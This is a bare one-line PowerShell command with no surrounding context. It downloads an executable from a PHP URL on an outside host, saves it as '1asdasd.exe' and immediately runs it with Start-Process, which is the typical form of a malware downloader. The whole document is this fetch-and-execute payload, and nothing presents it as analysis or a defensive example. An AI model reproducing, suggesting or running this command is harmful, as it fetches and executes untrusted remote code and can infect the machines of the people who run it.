
((new-object net.webclient).DownloadFile('http://auf87.maxipic.ch/rucymi/rybidy/facuwy.php','1asdasd.exe'));Start-Process '1asdasd.exe';

